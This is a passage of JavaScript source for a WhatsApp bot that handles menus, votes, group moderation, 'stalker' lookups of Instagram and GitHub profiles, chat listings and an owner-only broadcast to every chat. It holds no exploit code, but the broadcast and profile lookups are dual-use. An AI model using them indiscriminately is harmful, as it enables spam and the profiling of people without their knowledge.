            var unicorn = await getBuffer(picak+'allmenu')
            sendZeroBotIncMessage(from, { 
            text: `Hi @${sender.split("@")[0]}\n\n${allmenu(prefixo)}`,
            mentions:[sender],
            contextInfo:{
            mentionedJid:[sender],
            "externalAdReply": {
            "showAdAttribution": true,
            "renderLargerThumbnail": true,
            "title": botname, 
            "containsAutoReply": true,
            "mediaType": 1, 
            "thumbnail": fs.readFileSync("./Media/theme/zero-bot.png"),
            "mediaUrl": `${wagc}`,
            "sourceUrl": `${wagc}`
            }
            }
            })
            }
            break
case '/ownermenu': {
var unicorn = await getBuffer(picak+'Owner Menu')
sendZeroBotIncMessage(from, { 
text: `Hi @${sender.split("@")[0]}\n\n${ownermenu(prefixo)}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./Media/theme/zero-bot.png"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
break
case '/othermenu': {
	var unicorn = await getBuffer(picak+'Other Menu')
sendZeroBotIncMessage(from, { 
text: `Hi @${sender.split("@")[0]}\n\n${othermenu(prefixo)}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./Media/theme/zero-bot.png"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
break
case '/downloadmenu': {
var unicorn = await getBuffer(picak+'Download Menu')
sendZeroBotIncMessage(from, { 
text: `Hi @${sender.split("@")[0]}\n\n${downloadmenu(prefixo)}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./Media/theme/zero-bot.png"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
break
case '/groupmenu': {
var unicorn = await getBuffer(picak+'Group Menu')
sendZeroBotIncMessage(from, { 
text: `Hi @${sender.split("@")[0]}\n\n${groupmenu(prefixo)}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./Media/theme/zero-bot.png"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
break
case '/funmenu': {
var unicorn = await getBuffer(picak+'Fun Menu')
sendZeroBotIncMessage(from, { 
text: `Hi @${sender.split("@")[0]}\n\n${funmenu(prefixo)}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./Media/theme/zero-bot.png"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
break
case '/stalkermenu': {
var unicorn = await getBuffer(picak+'Stalker Menu')
sendZeroBotIncMessage(from, { 
text: `Hi @${sender.split("@")[0]}\n\n${stalkermenu(prefixo)}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./Media/theme/zero-bot.png"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}


case '/textpromenu': {
var unicorn = await getBuffer(picak+'Textpro Menu')
sendZeroBotIncMessage(from, { 
text: `Hi @${sender.split("@")[0]}\n\n${textpromenu(prefixo)}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./Media/theme/zero-bot.png"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
break
case '/photooxymenu': {
var unicorn = await getBuffer(picak+'Photooxy Menu')
sendZeroBotIncMessage(from, { 
text: `Hi @${sender.split("@")[0]}\n\n${photooxymenu(prefixo)}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./Media/theme/zero-bot.png"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
break
case '/ephoto360menu': {
var unicorn = await getBuffer(picak+'Photo360 Menu')
sendZeroBotIncMessage(from, { 
text: `Hi @${sender.split("@")[0]}\n\n${ephoto360menu(prefixo)}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./Media/theme/zero-bot.png"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
break
case '/animemenu': {
var unicorn = await getBuffer(picak+'Anime Menu')
sendZeroBotIncMessage(from, { 
text: `Hi @${sender.split("@")[0]}\n\n${animemenu(prefixo)}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./Media/theme/zero-bot.png"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
break
case '/stickermenu': {
var unicorn = await getBuffer(picak+'Sticker Menu')
sendZeroBotIncMessage(from, { 
text: `Hi @${sender.split("@")[0]}\n\n${stickermenu(prefixo)}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./Media/theme/zero-bot.png"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
break
case '/databasemenu': {
var unicorn = await getBuffer(picak+'Database Menu')
sendZeroBotIncMessage(from, { 
text: `Hi @${sender.split("@")[0]}\n\n${databasemenu(prefixo)}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./Media/theme/zero-bot.png"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
break
case '/aimenu': {
var unicorn = await getBuffer(picak+'OpenAI Menu')
sendZeroBotIncMessage(from, { 
text: `Hi @${sender.split("@")[0]}\n\n${aimenu(prefixo)}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./Media/theme/zero-bot.png"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
break
case '/bugmenu': {
var unicorn = await getBuffer(picak+'Bug Menu')
sendZeroBotIncMessage(from, { 
text: `Hi @${sender.split("@")[0]}\n\n${bugmenu(prefixo)}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./Media/theme/zero-bot.png"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
break

case '/friend':
case '/searchfriend':{

let teman = pickRandom(Zeroverifieduser)
setTimeout(() => {
ZeroStickWait()
}, 1000)
setTimeout(() => {
replygcZero('Managed to Get One Person')
}, 5000)
setTimeout(() => {
client.sendMessage(from, {text: `Here @${teman.split("@")[0]}`, mentions: [teman]}, { quoted : m })
}, 9000)
}
break
case '/sc': case '/script': case '/donate': case '/donate': case '/cekupdate': case '/updatebot': case '/cekbot': case '/sourcecode': {
me = m.sender
teks = `*「  ${global.botname} Script 」*\n\nGitHub: ${global.botscript}\n\nHi @${me.split('@')[0]} 👋\nDont forget to donate yeah🍜 👇 Contact Owner to donate`
sendZeroBotIncMessage(from, { 
text: teks,
mentions:[sender],
contextInfo:{
forwardingScore: 9999999,
isForwarded: true, 
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": defaultpp,
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
break
case '/request': case '/reportbug': {
	if (!text) return replygcZero(`Example : ${
        prefixo + command
      } hi dev play command is not working`)
            textt = `*| REQUEST/BUG |*`
            teks1 = `\n\n*User* : @${
   m.sender.split("@")[0]
  }\n*Request/Bug* : ${text}`
            teks2 = `\n\n*Hii ${pushname},You request has been forwarded to my Owners*.\n*Please wait...*`
            for (let i of owner) {
                client.sendMessage(i + "@s.whatsapp.net", {
                    text: textt + teks1,
                    mentions: [m.sender],
                }, {
                    quoted: m,
                })
            }
            client.sendMessage(from, {
                text: textt + teks2 + teks1,
                mentions: [m.sender],
            }, {
                quoted: m,
            })

        }
        break
case '/igstalk2':{

if (!q) return replygcZero(`Example ${prefixo+command} unicorn_Zero`)
ZeroStickWait()
const aj = await igstalk(`${q}`)
client.sendMessage(from, { image: { url : aj.profile }, caption: 
`*/ Instagram Stalker \\*

Full name : ${aj.fullname}
Username : ${aj.username}
Post : ${aj.post}
Followers : ${aj.followers}
Following : ${aj.following}
Bio : ${aj.bio}` }, { quoted: m } )
}
break
case '/ffstalk':{

if (!q) return replygcZero(`Example ${prefixo+command} 946716486`)
ZeroStickWait()
eeh = await ffstalk.ffstalk(`${q}`)
replygcZero(`*/ Free Fire Stalker \\*

Id : ${eeh.id}
Nickname : ${eeh.nickname}`)
}
break
case '/mlstalk': {

if (!q) return replygcZero(`Example ${prefixo+command} 530793138|8129`)
ZeroStickWait()
let dat = await mlstalk.mlstalk(q.split("|")[0], q.split("|")[1])
replygcZero(`*/ Mobile Legend Stalker \\*

Username : ${dat.userName}
Id : ${q.split("|")[0]}
ID Zone: ${q.split("|")[1]}`)
}
break
case '/npmstalk':{
if (!q) return replygcZero(`Example ${prefixo+command} Zeroapi`)
ZeroStickWait()
eha = await npmstalk.npmstalk(q)
replygcZero(`*/ Npm Stalker \\*

Name : ${eha.name}
Version Latest : ${eha.versionLatest}
Version Publish : ${eha.versionPublish}
Version Update : ${eha.versionUpdate}
Latest Dependencies : ${eha.latestDependencies}
Publish Dependencies : ${eha.publishDependencies}
Publish Time : ${eha.publishTime}
Latest Publish Time : ${eha.latestPublishTime}`)
}
break
case '/ghstalk': case '/githubstalk':{
if (!q) return replygcZero(`Example ${prefixo+command} DGXeon`)
ZeroStickWait()
aj = await githubstalk.githubstalk(`${q}`)
client.sendMessage(from, { image: { url : aj.profile_pic }, caption: 
`*/ Github Stalker \\*

Username : ${aj.username}
Nickname : ${aj.nickname}
Bio : ${aj.bio}
Id : ${aj.id}
Nodeid : ${aj.nodeId}
Url Profile : ${aj.profile_pic}
Url Github : ${aj.url}
Type : ${aj.type}
Admin : ${aj.admin}
Company : ${aj.company}
Blog : ${aj.blog}
Location : ${aj.location}
Email : ${aj.email}
Public Repo : ${aj.public_repo}
Public Gists : ${aj.public_gists}
Followers : ${aj.followers}
Following : ${aj.following}
Created At : ${aj.ceated_at}
Updated At : ${aj.updated_at}` }, { quoted: m } )
}
break
case '/ss': case '/ssweb': {
if (!q) return replygcZero(`Example ${prefixo+command} link`)
ZeroStickWait()
let krt = await scp1.ssweb(q)
client.sendMessage(from,{image:krt.result,caption:mess.succes}, {quoted:m})
}
break
case '/join': {
if (!ZeroTheCreator) return ZeroStickOwner()
if (!text) return replygcZero(`Contoh ${prefixo+command} linkgc`)
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return replygcZero('Link Invalid!')
let result = args[0].split('https://chat.whatsapp.com/')[1]
await client.groupAcceptInvite(result)
await replygcZero(`Done`)
}
break
case '/poll': {
	if (!ZeroTheCreator) return ZeroStickOwner()
            let [poll, opt] = text.split("|")
            if (text.split("|") < 2)
                return await replygcZero(
                    `Mention question and atleast 2 options\nExample: ${prefixo}poll Who is best admin?|Zero,Cheems,Doge...`
                )
            let options = []
            for (let i of opt.split(',')) {
                options.push(i)
            }
            await client.sendMessage(from, {
                poll: {
                    name: poll,
                    values: options
                }
            })
        }
        break
        case '/vote': {
            if (!m.isGroup) return ZeroStickGroup()
            if (m.chat in vote) return replygcZero(`_There are still votes in this chat!_\n\n*${prefixo}deletevote* - to delete votes`)
            if (!text) return replygcZero(`Enter Reason for Vote, Example: *${prefixo + command} Handsome Owner*`)
            replygcZero(`Voting starts!\n\n*${prefixo}upvote* - for upvote\n*${prefixo}downvote* - for downvote\n*${prefixo}checkvote* - to check the vote\n*${prefixo}deletevote* - to delete vote`)
            vote[m.chat] = [q, [], []]
            await sleep(1000)
            upvote = vote[m.chat][1]
            devote = vote[m.chat][2]
            teks_vote = `* VOTE *

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
│
│ 
└────

┌〔 DOWNVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
│
│ 
└────

Please Type Below
*${prefixo}upvote* - to cast vote
*${prefixo}downvote* -  to downvote
*${prefixo}deletevote* - to delete vote`
            client.sendMessage(from, {text: teks_vote}, {quoted:m})
	    }
            break
               case '/upvote': {
            if (!m.isGroup) return ZeroStickGroup()
            if (!(m.chat in vote)) return replygcZero(`_*no voting in this group!*_\n\n*${prefixo}vote* - to start voting`)
            isVote = vote[m.chat][1].concat(vote[m.chat][2])
            wasVote = isVote.includes(m.sender)
            if (wasVote) return replygcZero('You have Voted')
            vote[m.chat][1].push(m.sender)
            menvote = vote[m.chat][1].concat(vote[m.chat][2])
            teks_vote = `* VOTE *

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DOWNVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

Please Type Below
*${prefixo}upvote* - to upvote
*${prefixo}downvote* -  to downvote
*${prefixo}deletevote* - to delete vote`
            client.sendMessage(from, {text: teks_vote, mentions: menvote}, {quoted:m})
	    }
             break
                case '/downvote': {
            if (!m.isGroup) return ZeroStickGroup()
            if (!(m.chat in vote)) return replygcZero(`_*no voting in this group!*_\n\n*${prefixo}vote* - to start voting`)
            isVote = vote[m.chat][1].concat(vote[m.chat][2])
            wasVote = isVote.includes(m.sender)
            if (wasVote) return replygcZero('You have Voted')
            vote[m.chat][2].push(m.sender)
            menvote = vote[m.chat][1].concat(vote[m.chat][2])
            teks_vote = `* VOTE *

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DOWNVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

Please Type Below
*${prefixo}upvote* - to upvote
*${prefixo}downvote* -  to downvote
*${prefixo}deletevote* - to delete vote`
            client.sendMessage(from, {text: teks_vote, mentions: menvote}, {quoted:m})
	}
            break
                 
case '/checkvote':
if (!m.isGroup) return ZeroStickGroup()
if (!(m.chat in vote)) return replygcZero(`_*no voting in this group!*_\n\n*${prefixo}vote* - to start voting`)
teks_vote = `* VOTE *

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${upvote.length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DOWNVOTE 〕
│ 
├ Total: ${devote.length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

*${prefixo}deletevote* - to delete votes


©${client.user.id}
`
client.sendTextWithMentions(m.chat, teks_vote, m)
break
		case '/deletevote': case'delvote': case '/hapusvote': {
            if (!m.isGroup) return ZeroStickGroup()
            if (!(m.chat in vote)) return replygcZero(`_*no voting in this group!*_\n\n*${prefixo}vote* - to start voting`)
            delete vote[m.chat]
            replygcZero('Successfully Deleted Vote Session In This Group')
	    }
            break
case '/toonce': case '/toviewonce': { 
if (!quoted) return replygcZero(`Reply Image/Video`)
ZeroStickWait()
if (/image/.test(mime)) {
anuan = await client.downloadAndSaveMediaMessage(quoted)
client.sendMessage(from, {image: {url:anuan}, caption: `Here you go!`, fileLength: "999", viewOnce : true},{quoted: m })
} else if (/video/.test(mime)) {
anuanuan = await client.downloadAndSaveMediaMessage(quoted)
client.sendMessage(from, {video: {url:anuanuan}, caption: `Here you go!`, fileLength: "99999999", viewOnce : true},{quoted: m })
}
}
break
case '/fliptext': {
if (args.length < 1) return replygcZero(`Example:\n${prefixo}fliptext ${ownername}`)
quere = args.join(" ")
flipe = quere.split('').reverse().join('')
replygcZero(`\`\`\`「 FLIP TEXT 」\`\`\`\n*•> Normal :*\n${quere}\n*•> Flip :*\n${flipe}`)
}
break
            case '/listpc': {
                 let anulistp = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
                 let teks = `${themeemoji} *PERSONAL CHAT LIST*\n\nTotal Chat : ${anulistp.length} Chat\n\n`
                 for (let i of anulistp) {
                     let nama = store.messages[i].array[0].pushName
                     teks += `${themeemoji} *Name :* ${nama}\n${themeemoji} *User :* @${i.split('@')[0]}\n${themeemoji} *Chat :* https://wa.me/${i.split('@')[0]}\n\n────────────────────────\n\n`
                 }
                 client.sendTextWithMentions(m.chat, teks, m)
             }
             break
                case '/listgc': {
                 let anulistg = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)
                 let teks = `${themeemoji} *GROUP CHAT LIST*\n\nTotal Group : ${anulistg.length} Group\n\n`
                 for (let i of anulistg) {
                     let metadata = await client.groupMetadata(i)
                     teks += `${themeemoji} *Name :* ${metadata.subject}\n${themeemoji} *Owner :* ${metadata.owner !== undefined ? '@' + metadata.owner.split`@`[0] : 'Unknown'}\n${themeemoji} *ID :* ${metadata.id}\n${themeemoji} *Made :* ${moment(metadata.creation * 1000).tz('Asia/Kolkata').format('DD/MM/YYYY HH:mm:ss')}\n${themeemoji} *Member :* ${metadata.participants.length}\n\n────────────────────────\n\n`
                 }
                 client.sendTextWithMentions(m.chat, teks, m)
             }
             break
             case '/ping': case '/botstatus': case '/statusbot': case '/p': {
                const used = process.memoryUsage()
                const cpus = os.cpus().map(cpu => {
                    cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
			        return cpu
                })
                const cpu = cpus.reduce((last, cpu, _, { length }) => {
                    last.total += cpu.total
                    last.speed += cpu.speed / length
                    last.times.user += cpu.times.user
                    last.times.nice += cpu.times.nice
                    last.times.sys += cpu.times.sys
                    last.times.idle += cpu.times.idle
                    last.times.irq += cpu.times.irq
                    return last
                }, {
                    speed: 0,
                    total: 0,
                    times: {
			            user: 0,
			            nice: 0,
			            sys: 0,
			            idle: 0,
			            irq: 0
                }
                })
                let timestamp = speed()
                let latensi = speed() - timestamp
                neww = performance.now()
                oldd = performance.now()
                respon = `
Response Speed ${latensi.toFixed(4)} _Second_ \n ${oldd - neww} _miliseconds_\n\nRuntime : ${runtime(process.uptime())}

💻 Info Server
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}

_NodeJS Memory Usaage_
${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}

${cpus[0] ? `_Total CPU Usage_
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}
_CPU Core(s) Usage (${cpus.length} Core CPU)_
${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}
                `.trim()
                replygcZero(respon)
            }
            break
            case '/bctext': case '/broadcasttext': case '/broadcast': {
			    if (!ZeroTheCreator) return ZeroStickOwner()
		            if (!q) return replygcZero(`Enter text`)
		                            const data = await store.chats.all()
                            for (let i of data) {
                               client.sendMessage(i.id, {text: `${ownername}'s Broadcast\n\nMessage : ${q}` })
                               await sleep(1000)
                            }
                            }
                            break
                            case '/broadcastimage': case '/bcimage': case '/broadcastvideo': case '/broadcastvid':
if(!ZeroTheCreator) return ZeroStickOwner()
        if (!q) return replygcZero(`Enter text`)
        let getGroups = await client.groupFetchAllParticipating()
        let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
        let Zerocast = groups.map(v => v.id)
        replygcZero(` Broadcasting in ${Zerocast.length} Group Chat, in ${Zerocast.length * 1.5} seconds`)
        for (let i of Zerocast) {
let txt = `${ownername}'s Broadcast\n\nMessage : ${q}`
if(/image/.test(mime)) {
let media = await quoted.download()
await client.sendMessage(i, { image:media,  caption: txt,mentions:participants.map(a => a.id) })
}
if(/video/.test(mime)){
let media = await quoted.download()
await client.sendMessage(i, { video:media,  caption: txt, mentions:participants.map(a => a.id) })
}
            }
        replygcZero(`Successfuly Broadcasted in ${Zerocast.length} Groups`)      
        break
case '/block': case '/ban': {
		if (!ZeroTheCreator) return ZeroStickOwner()
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await client.updateBlockStatus(users, 'block')
		await replygcZero(`Done`)
	}
	break
        case '/unblock': case '/unban': {
		if (!ZeroTheCreator) return ZeroStickOwner()
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await client.updateBlockStatus(users, 'unblock')
		await replygcZero(`Done`)
	}
	break
case '/listblock': case '/listban': case '/blocklist': case '/banlist': {
	const lisben = "Total Block: " + banUser.length
	replygcZero(lisben)
	}
	break
case '/afk': {
if (!m.isGroup) return ZeroStickGroup()
if (!text) return replygcZero(`Example ${prefixo+command} want to sleep`)
let user = global.db.users[m.sender]
user.afkTime = + new Date
user.afkReason = args.join(" ")
replygcZero(`${m.pushName} Has Gone AFK\nReason : ${args.join(" ") ? args.join(" ") : ''}`)
}
break
case '/resetlinkgc':
case '/resetlinkgroup':
case '/resetlinkgrup':
case '/revoke':
case '/resetlink':
case '/resetgrouplink':
case '/resetgclink':
case '/resetgruplink': {
if (!m.isGroup) return ZeroStickGroup()
if (!isBotAdmins) return ZeroStickBotAdmin()
if (!isAdmins && !ZeroTheCreator) return ZeroStickAdmin()
client.groupRevokeInvite(m.chat)
}
break
            case '/react': {
                if (!ZeroTheCreator) return ZeroStickOwner()
                reactionMessage = {
                    react: {
                        text: args[0],
                        key: { remoteJid: m.chat, fromMe: true, id: quoted.id }
                    }
                }
                client.sendMessage(from, reactionMessage)
            }
            break
case '/group': case '/editinfo': {
if (!m.isGroup) return ZeroStickGroup()
if (!isAdmins && !ZeroTheCreator) return ZeroStickAdmin()
if (!isBotAdmins) return ZeroStickBotAdmin()
if (!q) return replygcZero(`Send orders ${command} _options_\nOptions : close & open\nExample : ${command} close`)
if (args[0] == 'close') {
client.groupSettingUpdate(from, 'announcement')
replygcZero(`Success Allows Only Admins To Send Messages To This Group`)
} else if (args[0] == 'open') {
client.groupSettingUpdate(from, 'not_announcement')
replygcZero(`Success Allows All Participants To Send Messages To This Group`)
} else {
replygcZero(`Type Command ${command} _pptions_\nOptions : Close & Open\nExample : ${command} close`)
}}
break
case '/autostickergc':
            case '/autosticker':
if (!isAdmins && !ZeroTheCreator) return ZeroStickAdmin()
if (args.length < 1) return replygcZero('type auto sticker on to enable\ntype auto sticker off to disable')
if (args[0]  === 'on'){
if (isAutoSticker) return replygcZero(`Already activated`)
autosticker.push(from)
fs.writeFileSync('./database/autosticker.json', JSON.stringify(autosticker))
replygcZero('autosticker activated')
} else if (args[0] === 'off'){
let anuticker1 = autosticker.indexOf(from)
autosticker.splice(anuticker1, 1)
fs.writeFileSync('./database/autosticker.json', JSON.stringify(autosticker))
replygcZero('auto sticker deactivated')
}
break
case '/antivirus': case '/antivirtex': {
if (!m.isGroup) return ZeroStickGroup()
if (!isBotAdmins) return ZeroStickBotAdmin()
if (!isAdmins && !ZeroTheCreator) return ZeroStickAdmin()
if (args[0] === "on") {
if (antiVirtex) return replygcZero('Already activated')
ntvirtex.push(from)
fs.writeFileSync('./database/antivirus.json', JSON.stringify(ntvirtex))
replygcZero('Success in turning on antivirus in this group')
var groupe = await client.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
client.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nNo body is allowed to send virus in this group, member who send will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!antiVirtex) return replygcZero('Already deactivated')
let off = ntvirtex.indexOf(from)
ntvirtex.splice(off, 1)
fs.writeFileSync('./database/antivirus.json', JSON.stringify(ntvirtex))
replygcZero('Success in turning off antivirus this group')
} else {
  await replygcZero(`Please Type The Option\n\nExample: ${prefixo + command} on\nExample: ${prefixo + command} off\n\non to enable\noff to disable`)
  }
  }
  break
case '/nsfw': {
if (!m.isGroup) return ZeroStickGroup()
if (!isBotAdmins) return ZeroStickBotAdmin()
if (!isAdmins && !ZeroTheCreator) return ZeroStickAdmin()
if (args[0] === "on") {
if (AntiNsfw) return replygcZero('Already activated')
ntnsfw.push(from)
fs.writeFileSync('./database/nsfw.json', JSON.stringify(ntnsfw))
replygcZero('Success in turning on nsfw in this group')
var groupe = await client.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
client.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nNsfw(not safe for work) feature has been enabled in this group, which means one can access sexual graphics from the bot!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiNsfw) return replygcZero('Already deactivated')
let off = ntnsfw.indexOf(from)
ntnsfw.splice(off, 1)
fs.writeFileSync('./database/nsfw.json', JSON.stringify(ntnsfw))
replygcZero('Success in turning off nsfw in this group')
} else {
  await replygcZero(`Please Type The Option\n\nExample: ${prefixo + command} on\nExample: ${prefixo + command} off\n\non to enable\noff to disable`)
  }
  }
  break
  case '/antilinkyoutubevideo': case '/antilinkyoutubevid': case '/antilinkytvid': {
if (!m.isGroup) return ZeroStickGroup()
if (!isBotAdmins) return ZeroStickBotAdmin()
if (!isAdmins && !ZeroTheCreator) return ZeroStickAdmin()
if (args[0] === "on") {
if (AntiLinkYoutubeVid) return replygcZero('Already activated')
ntilinkytvid.push(from)
fs.writeFileSync('./database/antilinkytvideo.json', JSON.stringify(ntilinkytvid))
replygcZero('Success in turning on youtube video antilink in this group')
var groupe = await client.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
client.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the youtube video link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkYoutubeVid) return replygcZero('Already deactivated')
let off = ntilinkytvid.indexOf(from)
ntilinkytvid.splice(off, 1)
fs.writeFileSync('./database/antilinkytvideo.json', JSON.stringify(ntilinkytvid))
replygcZero('Success in turning off youtube video antilink in this group')
} else {
  await replygcZero(`Please Type The Option\n\nExample: ${prefixo + command} on\nExample: ${prefixo + command} off\n\non to enable\noff to disable`)
  }
  }
  break
    case '/antilinkyoutubech': case '/antilinkyoutubechannel': case '/antilinkytch': {
if (!m.isGroup) return ZeroStickGroup()
if (!isBotAdmins) return ZeroStickBotAdmin()
if (!isAdmins && !ZeroTheCreator) return ZeroStickAdmin()
if (args[0] === "on") {
if (AntiLinkYoutubeChannel) return replygcZero('Already activated')
ntilinkytch.push(from)
fs.writeFileSync('./database/antilinkytchannel.json', JSON.stringify(ntilinkytch))
replygcZero('Success in turning on youtube channel antilink in this group')
var groupe = await client.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
client.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the youtube channel link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
